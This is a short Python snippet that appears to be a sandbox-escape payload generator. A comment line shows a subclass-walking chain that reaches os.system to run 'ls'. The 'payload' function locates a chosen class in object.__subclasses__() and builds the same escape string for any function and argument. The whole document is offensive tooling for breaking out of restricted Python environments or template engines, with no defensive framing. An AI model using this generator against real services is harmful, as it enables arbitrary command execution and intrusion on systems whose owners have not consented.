#().__class__.__base__.__subclasses__()[154].__init__.__globals__['system']('ls')

def payload(cls,fn,arg):
    classes=().__class__.__base__.__subclasses__()
    for i in range(len(classes)):
        if f'{cls}.' in str(classes[i]):
            return f"().__class__.__base__.__subclasses__()[{i}].__init__.__globals__['{fn}']({arg})"
